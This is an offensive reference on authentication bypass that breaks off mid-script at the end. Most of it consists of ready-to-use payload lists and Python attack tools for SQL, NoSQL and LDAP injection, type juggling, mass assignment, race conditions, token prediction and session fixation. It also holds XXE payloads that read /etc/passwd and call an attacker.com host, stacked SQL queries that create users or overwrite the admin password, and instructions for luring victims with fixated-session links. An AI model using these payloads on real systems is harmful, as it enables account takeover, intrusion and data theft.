# Authentication Bypass Techniques

## Table of Contents
1. [Direct Bypass Techniques](#1-direct-bypass-techniques)
2. [Logic Bypass Techniques](#2-logic-bypass-techniques)
3. [Token Bypass Techniques](#3-token-bypass-techniques)
4. [Protocol Bypass Techniques](#4-protocol-bypass-techniques)

---

## 1. Direct Bypass Techniques

### 1.1 SQL Injection Authentication Bypass

SQL injection allows attackers to manipulate database queries to bypass authentication by injecting malicious SQL code.

#### Vulnerable Code Example (PHP)
```php
// VULNERABLE: Direct string concatenation
function login($username, $password) {
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = mysqli_query($conn, $query);

    if (mysqli_num_rows($result) > 0) {
        return true;  // Authenticated
    }
    return false;
}

// Attacker input: username = admin'-- password = anything
// Resulting query: SELECT * FROM users WHERE username = 'admin'-- AND password = 'anything'
// The -- comments out the password check!
```

#### SQL Injection Payloads for Authentication Bypass
```sql
-- Basic bypass payloads
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
" OR "1"="1
" OR "1"="1"--
" OR "1"="1"#

-- Admin-specific bypass
admin'--
admin'#
admin'/*
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'#
admin')--
admin')#

-- Bypass with username field
' OR 1=1 LIMIT 1--
' OR 1=1 LIMIT 1#
') OR ('1'='1
') OR ('1'='1'--
') OR '1'='1'--

-- Union-based bypass
' UNION SELECT 1,2,3--
' UNION SELECT 'admin','password'--
' UNION SELECT NULL,NULL,NULL--

-- Time-based blind (for verification)
' OR SLEEP(5)--
' OR BENCHMARK(10000000,SHA1('test'))--

-- Order by bypass
' ORDER BY 1--
' ORDER BY 100-- (find column count)

-- Bypass with comments
'/**/OR/**/1=1--
'/**/OR/**/1=1#

-- Case manipulation
' oR '1'='1
' Or '1'='1
' OR '1'='1

-- Double encoding
%27%20OR%20%271%27%3D%271
%2527%20OR%20%25271%2527%253D%25271
```

#### Advanced SQL Injection Bypass
```sql
-- When = is filtered
' OR 1 LIKE 1--
' OR 1 BETWEEN 0 AND 2--
' OR 1 IN (1)--
' OR 1 REGEXP 1--

-- When spaces are filtered
'OR'1'='1
'||'1'='1
'+OR+'1'='1
'%0aOR%0a'1'='1
'/**/OR/**/'1'='1

-- When quotes are filtered
' OR 1=1--
' OR 0x61646d696e=username-- (hex for 'admin')
' OR username=CHAR(97,100,109,105,110)--

-- When OR is filtered
' || 1=1--
' && 1=1--
' XOR 1=0--
' | 1=1--

-- Bypassing WAF
/*!50000' OR 1=1*/--
' /*!OR*/ 1=1--
' %00OR 1=1--
' %0AOR%0A1=1--

-- Stacked queries (if supported)
'; INSERT INTO users VALUES('hacker','pass123')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

#### sqlmap Commands for Auth Bypass
```bash
# Basic auth bypass test
sqlmap -u "http://target/login" --data="username=admin&password=test" --level=5 --risk=3

# Test specific parameter
sqlmap -u "http://target/login" --data="username=admin&password=test" -p username --dump

# Bypass WAF
sqlmap -u "http://target/login" --data="username=admin&password=test" --tamper=space2comment,between

# Get database info
sqlmap -u "http://target/login" --data="username=admin&password=test" --dbs

# Dump users table
sqlmap -u "http://target/login" --data="username=admin&password=test" -D dbname -T users --dump
```

### 1.2 NoSQL Injection Authentication Bypass

NoSQL databases like MongoDB are vulnerable to injection attacks through JSON/BSON manipulation.

#### Vulnerable Code Example (Node.js/MongoDB)
```javascript
// VULNERABLE: Direct user input in query
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    const user = await User.findOne({
        username: username,
        password: password
    });

    if (user) {
        req.session.user = user;
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// Attacker sends:
// {"username": {"$gt": ""}, "password": {"$gt": ""}}
// This matches any user where username > "" AND password > ""
```

#### NoSQL Injection Payloads
```json
// Basic bypass - always true conditions
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": {"$exists": true}, "password": {"$exists": true}}

// Regex bypass
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}
{"username": {"$regex": "admin", "$options": "i"}, "password": {"$gt": ""}}

// Type manipulation
{"username": "admin", "password": {"$type": 2}}
{"username": {"$type": 2}, "password": {"$type": 2}}

// In array check
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}

// Where clause injection (if enabled)
{"$where": "this.username == 'admin' || true"}
{"$where": "function() { return true; }"}
{"$where": "1==1"}

// Or operator bypass
{"$or": [{"username": "admin"}, {"password": {"$gt": ""}}]}
{"$or": [{"username": {"$gt": ""}}, {"username": {"$lt": ""}}]}
```

#### NoSQL Injection via URL Parameters
```http
# GET request injection
GET /login?username[$gt]=&password[$gt]= HTTP/1.1
GET /login?username[$ne]=invalid&password[$ne]=invalid HTTP/1.1
GET /login?username[$regex]=.*&password[$regex]=.* HTTP/1.1
GET /login?username=admin&password[$ne]=x HTTP/1.1

# URL encoded
GET /login?username%5B%24gt%5D=&password%5B%24gt%5D= HTTP/1.1
GET /login?username%5B%24ne%5D=invalid&password%5B%24ne%5D=invalid HTTP/1.1
```

#### NoSQL Injection Script
```python
import requests
import json

class NoSQLInjector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = [
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": "admin", "password": {"$ne": ""}},
            {"username": "admin", "password": {"$gt": ""}},
            {"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$gt": ""}},
        ]

    def test_payloads(self):
        for payload in self.payloads:
            try:
                # Test as JSON
                response = requests.post(
                    self.target_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                if self.is_success(response):
                    print(f"[+] Bypass successful with payload:")
                    print(f"    {json.dumps(payload)}")
                    return payload

            except Exception as e:
                print(f"[-] Error: {e}")

        return None

    def is_success(self, response):
        # Customize based on target
        if response.status_code == 200:
            if "success" in response.text.lower():
                return True
            if "welcome" in response.text.lower():
                return True
            if "dashboard" in response.text.lower():
                return True
        if response.status_code == 302:
            return True
        return False

# Usage
injector = NoSQLInjector("https://target.com/api/login")
result = injector.test_payloads()
```

### 1.3 LDAP Injection Authentication Bypass

LDAP injection targets applications that use LDAP for authentication.

#### Vulnerable Code Example (PHP)
```php
// VULNERABLE: Direct string concatenation in LDAP query
function authenticate($username, $password) {
    $ldap_conn = ldap_connect("ldap://ldap.target.com");
    $base_dn = "dc=target,dc=com";

    // Vulnerable query construction
    $filter = "(&(uid=$username)(userPassword=$password))";

    $result = ldap_search($ldap_conn, $base_dn, $filter);

    if (ldap_count_entries($ldap_conn, $result) > 0) {
        return true;
    }
    return false;
}

// Attacker input: username = *)(&
// Results in: (&(uid=*)(&)(userPassword=anything))
// Matches all users!
```

#### LDAP Injection Payloads
```
# Basic bypass payloads
*
*)(&
*)(uid=*))(|(uid=*
*))%00
admin)(&)
admin)(|(password=*))
)(uid=*))
)(uid=*)(|(uid=*
*))(|(uid=admin

# Attribute extraction
*)(uid=*
*)(objectClass=*
*)(|(uid=admin)(uid=root))

# OR-based bypass
admin)(|(password=*
admin)(!(&(|
*))(&(uid=admin

# NULL byte injection
admin)%00
admin)\x00
*)\x00

# Parenthesis manipulation
admin)))
((uid=admin))
(&(uid=admin)(password=*))

# Wildcard bypass
admin*
*admin*
admin*))
*)(objectClass=*))

# Comment injection (environment dependent)
admin)#
admin)//
```

#### LDAP Injection Testing Script
```python
import ldap3
from ldap3 import Server, Connection, ALL

class LDAPInjectionTester:
    def __init__(self, ldap_server, base_dn):
        self.server = Server(ldap_server, get_info=ALL)
        self.base_dn = base_dn
        self.payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&)",
            "*))%00",
            "admin)(|(password=*))",
            ")(uid=*))",
        ]

    def test_filter_injection(self, username_field="uid"):
        for payload in self.payloads:
            try:
                conn = Connection(self.server)
                conn.bind()

                # Simulate vulnerable query
                search_filter = f"({username_field}={payload})"
                print(f"[*] Testing filter: {search_filter}")

                conn.search(
                    self.base_dn,
                    search_filter,
                    attributes=['uid', 'cn', 'mail']
                )

                if conn.entries:
                    print(f"[+] Injection successful with: {payload}")
                    for entry in conn.entries:
                        print(f"    Found: {entry}")
                    return True

            except Exception as e:
                print(f"[-] Error with payload {payload}: {e}")

        return False
```

### 1.4 XXE in SAML Authentication

SAML-based authentication can be vulnerable to XXE (XML External Entity) attacks.

#### Vulnerable SAML Processing
```python
# VULNERABLE: XML parsing without disabling external entities
from lxml import etree

def process_saml_response(saml_response):
    # Dangerous - allows XXE
    parser = etree.XMLParser()
    doc = etree.fromstring(saml_response, parser)

    # Extract user info
    username = doc.find('.//NameID').text
    return username
```

#### XXE Payloads for SAML
```xml
<!-- Basic XXE to read files -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

<!-- XXE with parameter entities for WAF bypass -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<samlp:Response>
  <saml:NameID>&send;</saml:NameID>
</samlp:Response>

<!-- Blind XXE with out-of-band -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe">
  %xxe;
]>
<samlp:Response>
  <saml:NameID>test</saml:NameID>
</samlp:Response>

<!-- SAML signature bypass with XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY admin "admin@target.com">
]>
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&admin;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

#### SAML Attack Tools
```bash
# SAML Raider (Burp Extension) - for testing SAML vulnerabilities
# Manual SAML token manipulation

# Decode SAML response (base64)
echo "BASE64_SAML_RESPONSE" | base64 -d

# Re-encode modified SAML
cat modified_saml.xml | base64 -w 0

# Check for XXE with DTD
curl -X POST http://target/saml/acs \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=$(cat xxe_saml.xml | base64 -w 0)"
```

### 1.5 PHP Type Juggling

PHP's loose type comparison can be exploited to bypass authentication.

#### Vulnerable Code Example
```php
// VULNERABLE: Using == instead of ===
function login($username, $password) {
    $stored_password = get_password_from_db($username);

    if ($password == $stored_password) {  // WEAK comparison!
        return true;
    }
    return false;
}

// If $stored_password = 0 and $password = "randomstring"
// PHP: "randomstring" == 0 evaluates to TRUE!

// If $stored_password starts with "0e" (scientific notation)
// PHP: "0e123" == "0e456" evaluates to TRUE (both equal 0)
```

#### Type Juggling Payloads
```php
// Magic hashes - strings that equal 0 in loose comparison
// MD5 hashes starting with "0e" followed by only digits
0e462097431906509019562988736854  // MD5("240610708")
0e830400451993494058024219903391  // MD5("QNKCDZO")
0e215962017                       // MD5("aabg7XSs")

// SHA1 hashes with magic properties
0e07766915004133176347055865026311692244  // SHA1("aaroZmOk")
0e76658526655756207688271159624026011393  // SHA1("aaK1STfY")

// JSON type confusion
{"username": "admin", "password": true}   // true == "any_string" is TRUE
{"username": "admin", "password": 0}      // 0 == "string_starting_with_non_digit" is TRUE
{"username": "admin", "password": []}     // May cause unexpected behavior

// Array comparison bypass
password[]=                                // Empty array
password[0]=                               // Array with empty element
```

#### Type Juggling Exploitation Script
```python
import requests
import json

class TypeJugglingAttack:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_type_juggling(self, username="admin"):
        payloads = [
            # Boolean bypass
            {"username": username, "password": True},
            {"username": username, "password": False},

            # Integer bypass
            {"username": username, "password": 0},
            {"username": username, "password": 1},

            # Array bypass
            {"username": username, "password": []},
            {"username": username, "password": [""]},

            # Null bypass
            {"username": username, "password": None},

            # Magic hash strings
            {"username": username, "password": "0"},
            {"username": username, "password": "0e123"},
        ]

        for payload in payloads:
            try:
                response = requests.post(
                    self.target_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                if self.is_success(response):
                    print(f"[+] Type juggling bypass with: {payload}")
                    return payload

            except Exception as e:
                pass

        # Test array in form data
        form_payloads = [
            {"username": username, "password[]": ""},
            {"username": username, "password[]": ["", ""]},
        ]

        for payload in form_payloads:
            try:
                response = requests.post(self.target_url, data=payload)
                if self.is_success(response):
                    print(f"[+] Array bypass with: {payload}")
                    return payload
            except:
                pass

        return None

    def is_success(self, response):
        return response.status_code == 200 and "welcome" in response.text.lower()
```

### 1.6 Mass Assignment

Mass assignment vulnerabilities allow attackers to modify fields they shouldn't have access to.

#### Vulnerable Code Example (Node.js)
```javascript
// VULNERABLE: Direct assignment from request body
app.post('/register', async (req, res) => {
    const user = new User(req.body);  // All fields from body!
    await user.save();
    res.json({ success: true });
});

// User model
const UserSchema = new mongoose.Schema({
    username: String,
    password: String,
    email: String,
    role: { type: String, default: 'user' },  // Attacker can set this!
    isAdmin: { type: Boolean, default: false }
});

// Attacker sends:
// {"username": "hacker", "password": "pass", "email": "h@x.com", "role": "admin", "isAdmin": true}
```

#### Mass Assignment Payloads
```json
// Privilege escalation
{"username": "test", "password": "pass", "role": "admin"}
{"username": "test", "password": "pass", "isAdmin": true}
{"username": "test", "password": "pass", "admin": true}
{"username": "test", "password": "pass", "is_superuser": true}
{"username": "test", "password": "pass", "permissions": ["admin", "write", "delete"]}
{"username": "test", "password": "pass", "access_level": 9999}

// Account takeover
{"email": "new@hacker.com", "id": 1}
{"email": "new@hacker.com", "user_id": 1}
{"reset_token": "known_value"}

// Bypassing verification
{"email": "hacker@evil.com", "email_verified": true}
{"phone": "1234567890", "phone_verified": true}
{"account_status": "active"}

// Modifying hidden fields
{"_id": "admin_user_id"}
{"created_at": "2020-01-01"}
{"updated_at": "2020-01-01"}
```

#### Mass Assignment Testing Script
```python
import requests
import json

class MassAssignmentTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.privilege_fields = [
            "role", "roles", "is_admin", "isAdmin", "admin",
            "is_superuser", "superuser", "access_level", "level",
            "permissions", "privilege", "user_type", "type",
            "account_type", "status", "verified", "active",
            "approved", "enabled", "group", "groups"
        ]

    def test_registration(self, base_data):
        """Test mass assignment during registration"""
        results = []

        for field in self.privilege_fields:
            test_values = [True, 1, "admin", "administrator", ["admin"]]

            for value in test_values:
                payload = base_data.copy()
                payload[field] = value

                response = requests.post(
                    self.target_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code in [200, 201]:
                    print(f"[*] Field accepted: {field} = {value}")
                    results.append((field, value, response.text))

        return results

    def test_profile_update(self, auth_token, base_data):
        """Test mass assignment during profile update"""
        headers = {
            "Authorization": f"Bearer {auth_token}",
            "Content-Type": "application/json"
        }

        for field in self.privilege_fields:
            payload = base_data.copy()
            payload[field] = True

            response = requests.put(
                f"{self.target_url}/profile",
                json=payload,
                headers=headers
            )

            if response.status_code == 200:
                # Check if field was actually updated
                profile = requests.get(
                    f"{self.target_url}/profile",
                    headers=headers
                ).json()

                if profile.get(field):
                    print(f"[+] Privilege escalation via {field}!")

# Usage
tester = MassAssignmentTester("https://target.com/api")
tester.test_registration({
    "username": "testuser",
    "password": "TestPass123!",
    "email": "test@example.com"
})
```

---

## 2. Logic Bypass Techniques

### 2.1 Forced Browsing

Accessing protected resources directly without proper authentication.

#### Vulnerable Application Structure
```
/admin/                    # Protected admin panel
/admin/dashboard.php       # Admin dashboard
/admin/users.php          # User management
/api/admin/users          # Admin API endpoint
/backup/                  # Backup files
/config/                  # Configuration files
/.git/                    # Git repository
```

#### Forced Browsing Payloads
```bash
# Directory enumeration with dirb
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# With gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# ffuf for fast fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Admin panel discovery
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt

# API endpoint discovery
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

#### Common Protected Paths
```
# Admin panels
/admin
/administrator
/admin.php
/admin.html
/adminpanel
/admin/login
/wp-admin
/manager
/management
/console

# API endpoints
/api/admin
/api/v1/admin
/api/users
/api/internal
/api/debug
/graphql

# Configuration files
/config
/configuration
/settings
/web.config
/.env
/config.php
/database.yml

# Backup/Debug
/backup
/backups
/debug
/test
/temp
/old
/bak

# Version control
/.git
/.git/config
/.svn
/.hg
```

### 2.2 Response Manipulation

Modifying server responses to bypass authentication checks performed client-side.

#### Vulnerable Code Example (Client-side check)
```javascript
// VULNERABLE: Authentication check on client side
fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
})
.then(response => response.json())
.then(data => {
    if (data.authenticated === true) {  // Client checks this!
        window.location = '/dashboard';
    } else {
        showError('Login failed');
    }
});
```

#### Response Manipulation Techniques

**Burp Suite Response Modification**
```
1. Intercept response in Burp Proxy
2. Find: {"authenticated": false, "error": "Invalid credentials"}
3. Replace: {"authenticated": true, "user": {"role": "admin"}}
4. Forward modified response

# Burp Match & Replace rules:
Match: "authenticated":false
Replace: "authenticated":true

Match: "success":false
Replace: "success":true

Match: "role":"user"
Replace: "role":"admin"
```

**Common Response Modifications**
```json
// Original response
{"status": "error", "authenticated": false}

// Modified response
{"status": "success", "authenticated": true}

// Boolean flipping
false -> true
0 -> 1
"no" -> "yes"
"fail" -> "success"
"denied" -> "granted"

// Role manipulation
"role": "user" -> "role": "admin"
"permissions": [] -> "permissions": ["admin", "write", "delete"]
"access_level": 1 -> "access_level": 10
```

#### mitmproxy Script for Response Manipulation
```python
from mitmproxy import http
import json

def response(flow: http.HTTPFlow):
    if "login" in flow.request.path or "auth" in flow.request.path:
        if flow.response.headers.get("content-type", "").startswith("application/json"):
            try:
                data = json.loads(flow.response.content)

                # Manipulate authentication status
                if "authenticated" in data:
                    data["authenticated"] = True
                if "success" in data:
                    data["success"] = True
                if "error" in data:
                    del data["error"]
                if "role" in data:
                    data["role"] = "admin"

                flow.response.content = json.dumps(data).encode()
                print(f"[+] Modified response for {flow.request.path}")

            except json.JSONDecodeError:
                pass

# Run: mitmproxy -s response_modifier.py
```

### 2.3 Multi-Step Authentication Bypass

Bypassing authentication by skipping steps in multi-step processes.

#### Vulnerable Multi-Step Process
```
Step 1: /login          - Enter username/password
Step 2: /verify-2fa     - Enter 2FA code
Step 3: /security-question - Answer security question
Step 4: /dashboard      - Access granted
```

#### Bypass Techniques
```python
import requests

class MultiStepBypass:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def bypass_direct_access(self):
        """Try accessing final step directly"""
        endpoints = [
            "/dashboard",
            "/home",
            "/account",
            "/profile",
            "/admin"
        ]

        for endpoint in endpoints:
            response = self.session.get(f"{self.base_url}{endpoint}")
            if response.status_code == 200 and "login" not in response.url:
                print(f"[+] Direct access to {endpoint} successful!")
                return True
        return False

    def bypass_skip_step(self, username, password):
        """Skip intermediate steps after first step"""
        # Complete step 1
        self.session.post(
            f"{self.base_url}/login",
            data={"username": username, "password": password}
        )

        # Skip step 2 (2FA) and try step 3 or 4 directly
        response = self.session.get(f"{self.base_url}/dashboard")
        if "dashboard" in response.text.lower():
            print("[+] Skipped 2FA successfully!")
            return True

        return False

    def bypass_parameter_manipulation(self, username, password):
        """Manipulate step parameters"""
        # Try sending step completion indicators
        payloads = [
            {"username": username, "password": password, "step": "complete"},
            {"username": username, "password": password, "2fa_verified": "true"},
            {"username": username, "password": password, "skip_2fa": "1"},
            {"username": username, "password": password, "mfa_complete": "true"},
        ]

        for payload in payloads:
            response = self.session.post(
                f"{self.base_url}/login",
                data=payload
            )
            if "dashboard" in response.text.lower() or response.status_code == 302:
                print(f"[+] Bypass with payload: {payload}")
                return True

        return False

# Usage
bypasser = MultiStepBypass("https://target.com")
bypasser.bypass_direct_access()
bypasser.bypass_skip_step("admin", "password123")
```

### 2.4 Race Condition Authentication Bypass

Exploiting race conditions in authentication timing.

#### Vulnerable Code Example
```python
# VULNERABLE: Race condition in password reset
@app.route('/reset-password', methods=['POST'])
def reset_password():
    token = request.form['token']
    new_password = request.form['password']

    # Check token (but don't invalidate yet)
    reset_request = PasswordReset.query.filter_by(token=token).first()

    if reset_request and not reset_request.used:
        # Window of vulnerability here!
        user = User.query.get(reset_request.user_id)
        user.password = hash_password(new_password)

        # Now invalidate token (too late!)
        reset_request.used = True

        db.session.commit()
        return "Password updated"

    return "Invalid token"
```

#### Race Condition Exploitation
```python
import requests
import threading
import time

class RaceConditionExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.success_count = 0

    def send_request(self, token, password):
        try:
            response = requests.post(
                self.target_url,
                data={"token": token, "password": password},
                timeout=10
            )
            if "Password updated" in response.text:
                self.success_count += 1
                print(f"[+] Success with password: {password}")
        except:
            pass

    def exploit(self, token, num_threads=50):
        """Send multiple requests simultaneously"""
        threads = []

        for i in range(num_threads):
            password = f"HackedPass{i}!"
            t = threading.Thread(target=self.send_request, args=(token, password))
            threads.append(t)

        # Start all threads as simultaneously as possible
        for t in threads:
            t.start()

        for t in threads:
            t.join()

        print(f"[*] Total successful resets: {self.success_count}")

# Turbo Intruder script for Burp Suite
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=True)

    for i in range(50):
        engine.queue(target.req, f"password{i}")

def handleResponse(req, interesting):
    if "success" in req.response.lower():
        table.add(req)
```

### 2.5 Null Byte Injection

Using null bytes to truncate strings and bypass validation.

#### Vulnerable Code Example
```php
// VULNERABLE: Null byte truncation in older PHP
function checkExtension($filename) {
    $allowed = array('.jpg', '.png', '.gif');
    $ext = substr($filename, strrpos($filename, '.'));

    if (in_array($ext, $allowed)) {
        return true;
    }
    return false;
}

// Attack: shell.php%00.jpg
// checkExtension sees: .jpg (allowed!)
// File system sees: shell.php (null byte truncates)
```

#### Null Byte Payloads
```
# File extension bypass
shell.php%00.jpg
shell.php%00.png
shell.php\x00.jpg
shell.php\0.jpg

# Path traversal with null byte
../../../etc/passwd%00.jpg
../../../etc/passwd%00
..%00/etc/passwd

# Authentication bypass
admin%00
admin\x00
admin%00garbage

# SQL injection with null byte
admin'%00
admin'--%00

# URL encoding variants
%00
%2500
\x00
\u0000
```

---

## 3. Token Bypass Techniques

### 3.1 Token Prediction

Predicting or guessing authentication tokens.

#### Vulnerable Token Generation
```python
import time
import random

# VULNERABLE: Predictable token generation
def generate_reset_token_weak():
    # Using timestamp - predictable!
    return str(int(time.time()))

# VULNERABLE: Weak random
def generate_session_id_weak():
    random.seed(time.time())  # Predictable seed!
    return ''.join(random.choices('abcdef0123456789', k=32))

# VULNERABLE: Sequential tokens
token_counter = 0
def generate_token_sequential():
    global token_counter
    token_counter += 1
    return f"TOKEN_{token_counter}"
```

#### Token Prediction Script
```python
import requests
import time
import random
import hashlib

class TokenPredictor:
    def __init__(self, target_url):
        self.target_url = target_url

    def predict_timestamp_token(self, target_time, window=60):
        """Predict tokens based on timestamp"""
        tokens = []

        # Generate tokens for time window
        for offset in range(-window, window + 1):
            timestamp = int(target_time) + offset
            tokens.append(str(timestamp))
            tokens.append(hashlib.md5(str(timestamp).encode()).hexdigest())
            tokens.append(hashlib.sha1(str(timestamp).encode()).hexdigest())

        return tokens

    def predict_sequential_token(self, known_token, count=100):
        """Predict sequential tokens"""
        tokens = []

        # Try numeric sequences
        try:
            num = int(known_token)
            for i in range(-count, count):
                tokens.append(str(num + i))
        except ValueError:
            pass

        # Try prefixed sequences
        if '_' in known_token:
            prefix, num_part = known_token.rsplit('_', 1)
            try:
                num = int(num_part)
                for i in range(-count, count):
                    tokens.append(f"{prefix}_{num + i}")
            except ValueError:
                pass

        return tokens

    def test_tokens(self, tokens, token_param="token"):
        """Test predicted tokens"""
        for token in tokens:
            response = requests.get(
                self.target_url,
                params={token_param: token}
            )

            if response.status_code == 200 and "invalid" not in response.text.lower():
                print(f"[+] Valid token found: {token}")
                return token

        return None

# Usage
predictor = TokenPredictor("https://target.com/reset-password")
tokens = predictor.predict_timestamp_token(time.time())
valid = predictor.test_tokens(tokens)
```

### 3.2 Session Fixation

Forcing a victim to use an attacker-controlled session.

#### Vulnerable Code Example
```php
// VULNERABLE: Session ID accepted from URL
session_start();

// Accept session ID from GET parameter
if (isset($_GET['PHPSESSID'])) {
    session_id($_GET['PHPSESSID']);
    session_start();
}

// After user logs in, same session ID is used
// Attacker who set the session ID now has access!
```

#### Session Fixation Attack
```python
import requests

class SessionFixation:
    def __init__(self, target_url, login_url):
        self.target_url = target_url
        self.login_url = login_url

    def generate_attack_link(self):
        """Generate link with attacker's session"""
        # Get a new session from target
        session = requests.Session()
        response = session.get(self.target_url)

        # Extract session cookie
        session_cookie = session.cookies.get('PHPSESSID') or \
                        session.cookies.get('session') or \
                        session.cookies.get('JSESSIONID')

        if session_cookie:
            # Create attack URL
            attack_url = f"{self.login_url}?PHPSESSID={session_cookie}"
            print(f"[+] Attack URL: {attack_url}")
            print(f"[+] Session ID: {session_cookie}")
            print("[*] Send this link to victim. After they login,")
            print(f"[*] use this session ID to access their account.")
            return attack_url, session_cookie

        return None, None

    def check_session(self, session_id):
        """Check if fixated session is authenticated"""
        session = requests.Session()
        session.cookies.set('PHPSESSID', session_id)

        response = session.get(f"{self.target_url}/dashboard")

        if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
            print(f"[+] Session {session_id} is authenticated!")
            return True

        return False

# URL-based fixation payloads
fixation_urls = [
    "http://target.com/login?PHPSESSID=attacker_session",
    "http://target.com/login?session=attacker_session",
    "http://target.com/login?JSESSIONID=attacker_session",
    "http://target.com/login?sid=attacker_session",
    "http://target.com/login;jsessionid=attacker_session",
]
```

### 3.3 Token Leakage

Finding tokens leaked in various locations.

#### Token Leakage Locations
```bash
# URLs and Referer headers
# Tokens in URL are logged and leaked via Referer

# Check server logs
grep -r "token=" /var/log/apache2/access.log
grep -r "session=" /var/log/nginx/access.log
grep -r "auth=" /var/log/

# Check browser history
# Check Referer headers when clicking external links

# JavaScript exposure
# Check if tokens are in window object or global scope

# API responses
# Check if tokens appear in API responses unnecessarily

# Error messages
# Check if tokens appear in error pages
```

#### Token Leakage Detection Script
```python
import requests
from urllib.parse import urlparse, parse_qs
import re

class TokenLeakageDetector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def check_url_leakage(self, response):
        """Check if tokens appear in URL"""
        url = response.url
        params = parse_qs(urlparse(url).query)

        sensitive_params = ['token', 'session', 'auth', 'key', 'api_key', 'secret']

        for param in sensitive_params:
            if param in params:
                print(f"[!] Token in URL: {param}={params[param]}")
                return True

        return False

    def check_referer_leakage(self, url_with_token, external_url):
        """Check if token leaks via Referer header"""
        # Simulate clicking external link from page with token in URL
        response = self.session.get(
            external_url,
            headers={'Referer': url_with_token}
        )

        # In real scenario, check if external site received the token
        print(f"[*] Referer sent: {url_with_token}")
        return True

    def check_response_leakage(self, response):
        """Check for tokens in response body"""
        patterns = [
            r'token["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]+)["\']',
            r'session[_id]*["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]+)["\']',
            r'api[_]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]+)["\']',
            r'auth[orization]*["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]+)["\']',
            r'bearer\s+([a-zA-Z0-9_.-]+)',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                print(f"[!] Potential token leak: {matches}")

    def check_cors_leakage(self, url):
        """Check if CORS allows token stealing"""
        response = self.session.options(
            url,
            headers={'Origin': 'https://evil.com'}
        )

        acao = response.headers.get('Access-Control-Allow-Origin', '')
        acac = response.headers.get('Access-Control-Allow-Credentials', '')

        if acao == '*' or acao == 'https://evil.com':
            if acac.lower() == 'true':
                print("[!] CORS misconfiguration allows credential theft!")
                return True

        return False
```

### 3.4 Token Replay Attacks

Reusing captured tokens after they should be invalid.

#### Vulnerable Code Example
```python
# VULNERABLE: Token not invalidated after use
def verify_email(token):
    verification = EmailVerification.query.filter_by(token=token).first()

    if verification:
        user = User.query.get(verification.user_id)
        user.email_verified = True
        db.session.commit()
        return True  # Token still valid for reuse!

    return False

# VULNERABLE: No token expiration
def password_reset(token, new_password):
    reset = PasswordReset.query.filter_by(token=token).first()

    if reset:  # No expiration check!
        user = User.query.get(reset.user_id)
        user.password = hash_password(new_password)
        db.session.commit()
        return True

    return False
```

#### Token Replay Testing
```python
import requests
import time

class TokenReplayTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_token_reuse(self, token, token_param="token"):
        """Test if token can be used multiple times"""
        # First use
        response1 = requests.post(
            self.target_url,
            data={token_param: token, "password": "NewPass1!"}
        )

        if "success" not in response1.text.lower():
            print("[-] First use failed")
            return False

        # Wait and try again
        time.sleep(2)

        # Second use
        response2 = requests.post(
            self.target_url,
            data={token_param: token, "password": "NewPass2!"}
